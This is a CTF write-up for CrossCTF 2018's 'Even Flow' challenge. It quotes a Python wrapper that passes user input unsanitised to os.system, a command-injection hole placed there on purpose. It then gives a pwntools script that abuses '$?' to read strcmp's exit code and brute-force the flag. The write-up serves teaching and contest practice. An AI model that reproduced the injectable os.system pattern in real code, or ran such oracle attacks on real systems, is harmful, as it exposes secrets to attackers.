# Even Flow - CrossCTF Quals 2018 (crypto)

> Do you like shell command injection?
>
> nc ctf.pwn.sg 1601
>
> Creator - amon (@nn_amon)

## Challenge
We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.

First, a string that is called "flag", and then another string consisting of only 2 bytes called "shell".
```
sys.stdout.write("Flag: ")
sys.stdout.flush()
flag = sys.stdin.readline().strip()

sys.stdout.write("Shell: ")
sys.stdout.flush()
shell = sys.stdin.read(2)
```

The "flag" would be passed as an argument into the `evenflow` binary, while the "shell" is just being passed to `echo`.
```
os.system("./evenflow " + flag + "; echo \"" + shell + "\"");
```

We were also given the source of `evenflow`, which just reads the flag from a file, and performs `strcmp` on the "flag" that we passed in and the actual flag.
```
size_t get_file_size(char * filename) {
    struct stat st;
    stat(filename, &st);
    return st.st_size;
}

int main(int argc, char ** argv) {
    FILE * fd = fopen("flag", "r");
    size_t file_size = get_file_size("flag");
    char * buffer = malloc(file_size);
    fread(buffer, 1, file_size, fd);
    return strcmp(buffer, argv[1]);
}
```

The interesting part of this code is the last line,
```
return strcmp(buffer, argv[1]);
```

According to documentation, `strcmp` will return a number that says how far the first differing character is away from each other.

## Exploit
### $?
In a shell, `$?` contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to `echo`, we can just send in `$?` for "shell".

So, we can call `echo $?` which will give us the return value of `./evenflow flag`, which will let us know how far away is the first differing character from the actual flag. 

With this information, we can keep "correcting" our flag until we get the actual flag.

### Script
We can write a script to automate this process.
```
from pwn import *

def tryf(flag):
    p = remote('ctf.pwn.sg', 1601)

    p.sendlineafter('Flag: ', flag)
    p.sendlineafter('Shell: ', '$?')

    # returns the return value of evenflow
    return int(p.recvline())

# The Idea:
# Basically, we compare the actual flag to "0",
# Then adjust it based on the output of strcmp (the exit code)
# e.g. to "C", then add a "0" => "C0"
# and repeat till we get "}", the end of the flag

s = "0"
while True:
    i = tryf(s)

    # adjust!
    c = chr(ord('0')+i)
    s = s[:-1] + c

    if s[-1] == '}':
        print(s)
        break

    s+='0'
```